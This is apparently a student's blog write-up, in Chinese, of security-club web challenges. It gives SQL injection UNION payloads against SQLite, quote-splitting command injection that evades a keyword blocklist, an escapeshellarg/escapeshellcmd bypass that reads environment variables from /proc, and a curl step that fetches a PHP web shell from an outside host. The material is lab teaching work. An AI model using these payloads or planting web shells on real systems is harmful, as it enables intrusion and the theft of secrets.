---
title: 2023 Fall Bamboofox社課題解 Week 2
top_img: transparent
date: 2023-10-13 01:17:35
tags:
    - 資安
    - WebSecurity
    - Bamboofox社課題解
categories:
    - Bamboofox社課
cover: Bamboofox社課/bamboofox-2023-fall-week2/111611540.jpg
description: 2023 Fall Bamboofox社課題解 Week 2 (WebSecurity)
---

這次上課比上次難不少，希望下次還能夠聽懂

[本周題目](https://bamboofox.cs.nctu.edu.tw/courses/16/challenges)

## 1. [[Web] Login Panel 2 (other table)](https://bamboofox.cs.nctu.edu.tw/courses/16/challenges/270)

除了登入會接觸到的table，可能還有其他的table，要嘗試把其他table抓出來

這裡使用一連串SQL injection的技巧，把密碼設計成以下，使用[第一次社課](https://a40693651.github.io/Bamboofox%E7%A4%BE%E8%AA%B2/bamboofox-2023-fall-week1/)的第三題做變化:
```sql
' UNION SELECT 1,(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),3,4 --
```

其中這串指令，代表的是把所有的table名字抓出來:
```sql
SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'
```

- group_concat()是把裡面的資料用','連接起來
- sqlite_master可以想成是所有系統資料的的唯讀總table，裡面也包含了table的資料，裡面有這些column:type,name,tbl_name,rootpage,sql，其中所有table的type都是'table'，table的name跟tbl_name都是放table的名字。所以找這兩個column取得tablea名字
- tbl_name NOT like 'sqlite_%'則是避免抓出名字是sqlite_...的table，基本上就是避免抓到系統自帶的table，而是存放有意義資料的table

這題的sqlite_master的示例圖:
![](/Bamboofox社課/bamboofox-2023-fall-week2//sqlite_master.png)


進去之後，可以在welcome的地方看到，這個資料庫裡面有兩個分別是Users跟S3cr3t_t4bl3，User顯然是登入用的前幾題已經打過了，所以現在要來看看S3cr3t_t4bl3有甚麼。

首先在密碼使用這個injection來取得S3cr3t_t4bl3有哪些column:
```sql
' UNION SELECT 1,(SELECT sql FROM sqlite_master WHERE type='table' AND sql NOT NULL AND name ='S3cr3t_t4bl3'),3,4 --
```
其中這一句代表的是，找出所有的column及他的型別等:
```sql
SELECT sql FROM sqlite_master WHERE type='table' AND sql NOT NULL AND name ='S3cr3t_t4bl3'
```

- 在sqlite_master的sql這個column中，存有建立這個table的sql指令，因為建立的時候，要下有哪些column的參數，所以抓出這個指令就可以知道有哪些column了(可以看上面的splite_master示例圖理解)
- sql NOT NULL 則是要避免找到空的東西
- name = 'S3cr3t_t4bl3'則是要找到這個table的內容 

因為這個資料庫比較簡單，所以把那串長指令直接換成這樣也OK:
```sql
SELECT sql FROM sqlite_master WHERE name ='S3cr3t_t4bl3'
```

指令下完之後，會發現splite_master有flag_test1234這個column，一看就知道放了flag，所以只要用以下injection塞進密碼，取得裡面資料就可以拿到flag了:
```sql
' UNION SELECT 1,(SELECT flag_test1234 FROM S3cr3t_t4bl3),3,4 --
```

## 2. [[Web] Starburst Cat Shop](https://bamboofox.cs.nctu.edu.tw/courses/16/challenges/277)

這個買貓咪的網站，一般來講購買的程式碼流程會是，判斷錢夠不夠->扣錢，如果沒有對同步發送請求做處理的話，就會出問題。
以這題來說，只要點的夠快的話，上一個request1還沒扣款時，request2先被判斷到錢夠不夠，就算request1會讓錢不夠，request2還是能夠購買成功(不過最後會錢會變負數)

總結來講，只要對Fast Cat的購買鍵狂點就好了

## 3. [[Web] Curl Online](https://bamboofox.cs.nctu.edu.tw/courses/16/challenges/272)

這題從題目就可以看出來，是跟Curl這個linux指令有關，查看網頁的原始碼，會發現裡面的PHP有對於Curl的操作，而Curl是個功能性很強的指令，網頁敢放出來給別人用，我們就可以來濫用Curl

需要知道的PHP語法

- 在html裡面打<?php ...;...; ?>，...的部分就可以打PHP了(...要是html的內容)
- echo ... : 顯示...
- $url : 表示名稱為url的變數
- system('terminal指令;terminal指令') : 可以對其terminal下指令 ex: system('ls;cat test.txt')
- $_GET['url'] : 取得連結中名稱為'url'的參數(https://...?url=123 的url就會被取得)
- preg_match('/(...)/','str') : 看str字串裡面，有沒有符合第一個參數的東西(第一個參數使用正則表達示表示) 

需要知道的linux指令
- curl [URL] : 取得URL這個連結給的回傳
- curl -s : -s(silent)讓curl不輸出任何東西的參數
- curl [URL] -o [file] : 把curl從URL連結取得的東西下載到file之中 
- ls  : 列出當前目錄下的所有檔案、資料夾
- ls '路徑' : 列出該路徑下的所有檔案、資料夾
- cat [file] : 印出檔案的內容

這題我們要先做的是，讓網頁的PHP執行ls指令，先看看裡面有甚麼東西

因為網頁就這個PHP，我們可以透過調整url的參數，來使system函式不只做curl
```php
$url = $_GET['url'];
if (preg_match('/(flag|cat|ls|head|tail|whoami|\\|\s)/i', $url)) {
    die('Hack detected!');
}
$response = system("curl -s '$url'");
```

在網址欄輸入以下網址，理論上就可以讓他跑出ls指令
```php
';'ls
```

在system裡面會長成這樣:
```php
system("curl -s '';'ls'")
```
前面的單引號被弄成空字串不會起作用，再另外打上ls，這樣就可以下ls的指令了

但是這時候會出現hack detectd，因為網站有preg_match的PHP碼來防止某些關鍵字出現
不過linux指令有個特性是，他是以字串的形式輸入，所以ls改成'l's，或是cat改成c'a't，他都能照原本的方式運作，並且能防止被preg_match抓到

所以改成指令:
```php
';l's
變成
system("curl -s '';l's'")
```
然後會發現這個目錄底下沒啥好看的，所以我們改成從根目錄開始看

下指令:
```php
';l's' '/
變成
system("curl -s '';l's' '/'")
```
會發現有個flag-415cd468353da8d26974ae6f8a7d9b30a830b8b4的檔案，一看就藏了flag，所以我們嘗試讓他發送cat指令來輸出

下指令(注意他也擋了cat跟flag，所以用跟l's'一樣的手法處理):
```php
';ca't' '/f'l'ag-415cd468353da8d26974ae6f8a7d9b30a830b8b4
變成
system("curl -s '';ca't' '/f'l'ag-415cd468353da8d26974ae6f8a7d9b30a830b8b4'")
```
這樣就可以得到這題的flag了


## 4. [[Web] Curl Online Pro](https://curl-online-pro.ching367436.me:8443/?url=example.com%2F)

這是上一題的進階，從source code可以看到，他使用了escapeshellarg跟escapeshellcmd函式來避免輸入的東西帶有指令。不過這兩個東西同時使用(先用arg再用cmd)的時候卻會發生問題

source code:
```php
$url = escapeshellarg($url);
$cmd = escapeshellcmd("curl -s $url");
return $cmd;
```

escapeshellarg函式的功能是在資料的兩側加上單引號，以保證他是字串，避免讀入分號之類的會影響操作的字
ex: 
```
;ls -> ';ls'
```
如果資料中有單引號'，則讓他跳脫並保證他是字串
ex: 
```
' -> '\''
```
透過這個函式可以很好的避免被攻擊

escapeshellcmd則是會讓&#;|*?~<>^()[]{}$\以及沒有配對到的單引號與雙引號等符號被跳脫，避免特殊字影響操作
ex: 
```
' -> \' 
? -> \?
```

但當他們加在一起(按arg再cmd的順去)，對於單引號的防護就會失效
ex:
```
' -> '\'' -> '\\'\'
```

用來處理在網頁輸入的連結就會變成
```
https://a' b -> http://a'\\'' b\
```
變成兩個用空格隔開的東西，因為curl可以同時處理好幾個用空格隔開的連結，就會導致我們可以對於後面的連結做操作

在source code中，有提示flag藏在環境變數裡
```php
$hint = "The flag for Curl Online Pro is: " . $_ENV['FLAG_ENV'] . "\n";
```
所以我們要想辦法抓出環境變數

linux有個很特別的點是，他把很多東西都存成檔案的形式，像是環境變數就存在'/proc/self/environ'的路徑裡，所以我們的目標是把他取出來。

這個網站原本是使用http協議進行資料的傳輸，不過http是用來傳輸html的，如果我們要取得file，就要用到FTP的協議(格式:file://host/path)

所以我們下指令(在本機上，host似乎就不用加東西了)
```php
a' file:///proc/self/environ 'b
變成
curl -s 'http://a'\\'' file:///proc/self/environ '\\''b'
```
第一跟第二個東西都不會起作用，只有中間的FTP會運作，透過這個方式就可以取得環境變數作為respond，進而找到flag了

## 5. [[Web] Curl Online Max](https://bamboofox.cs.nctu.edu.tw/courses/16/challenges/276)

這題是上一題的更進階，可以讓我們隨意輸入指令。本題的網站跟上一題相同，在source code一樣有提示

source code:
```php
$hint .= "Run `/readflag` to get the flag for Curl Online Max\n";
```
讓他能跑/readflag指令，就可以取得flag，所以我們要先能讓他任意輸入指令

講linux語法的時候有講過，curl [URL] -o [file]可以把URL連結取得的東西下載到file之中。
所以我們只要讓他執行這個指令，下載了一個file進去，我們就可以透過"網址/filename"的方式碰到這個file，如果這個file是個PHP檔，就可以用來執行指令

這邊學長有先寫好一個可以下載的PHP檔，https://training.ching367436.me/shell/shell.php
內容如下:
```php
<?php 
    if(isset($_REQUEST['cmd'])){ 
        echo "<pre>"; 
        $cmd = ($_REQUEST['cmd']); 
        system($cmd); 
        echo "</pre>"; 
        die;
    }
?>
```
他可以執行url中，cmd參數所帶的指令

這裡我們嘗試下指令讓他下載這個檔案:
```php
https://training.ching367436.me/shell/shell.php' -o attack.php 'b
變成
curl -s 'https://training.ching367436.me/shell/shell.php'\\'' -o attack.php '\\''b'
```
這樣他就會到
https://training.ching367436.me/shell/shell.php/
下載這個檔案(/不用理，應該有做重定向?)，並塞到新建的attack.php裡面

之後就可以透過網址
```
https://curl-online-pro.ching367436.me:8443/attack.php
```
跟這個php檔作互動

最後只要帶上參數:
```
https://curl-online-pro.ching367436.me:8443/attack.php?cmd=/readflag
```
就可以取得flag了

封面圖來源: [表情が素晴らしかったです](https://www.pixiv.net/artworks/111611540)

---

